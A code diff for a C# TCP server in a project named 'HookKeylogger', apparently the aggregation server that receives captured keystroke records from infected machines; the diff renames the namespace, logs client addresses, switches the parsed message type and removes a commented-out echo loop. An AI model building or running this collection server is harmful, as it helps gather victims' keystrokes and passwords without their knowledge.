@@ -3,8 +3,9 @@ using System.Net;
 using System.Net.Sockets;
 using HookKeylogger.Base;
 using System.IO;
+using HookKeylogger.AggergationServer.Types;
 
-namespace Server
+namespace HookKeylogger.AggergationServer
 {
     class Server
     {
@@ -38,7 +39,7 @@ namespace Server
                     // Perform a blocking call to accept requests.
                     // You could also user server.AcceptSocket() here.
                     TcpClient client = server.AcceptTcpClient();
-                    Console.WriteLine("Connected!");
+                    Console.WriteLine("Connected! From {0}", client.Client.RemoteEndPoint);
 
                     data = null;
 
@@ -46,12 +47,12 @@ namespace Server
                     StreamExtension stream = new StreamExtension(client.GetStream());
 
                     int i;
-                    KeyPress kp;
+                    CI kp;
                     while (stream.IsConnected())
                     {
                         try
                         {
-                            kp = KeyPress.Parser.ParseDelimitedFrom(stream);
+                            kp = CI.Parser.ParseDelimitedFrom(stream);
                             Console.WriteLine("Received: {0}", kp);
                         }
                         catch (IOException)
@@ -59,23 +60,6 @@ namespace Server
                             break;
                         }
                     }
-
-                    //// Loop to receive all the data sent by the client.
-                    //while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
-                    //{
-                    //    // Translate data bytes to a ASCII string.
-                    //    data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
-                    //    Console.WriteLine("Received: {0}", data);
-
-                    //    // Process the data sent by the client.
-                    //    data = data.ToUpper();
-
-                    //    byte[] msg = System.Text.Encoding.ASCII.GetBytes(data);
-
-                    //    // Send back a response.
-                    //    stream.Write(msg, 0, msg.Length);
-                    //    Console.WriteLine("Sent: {0}", data);
-                    //}
 
                     // Shutdown and end connection
                     client.Close();
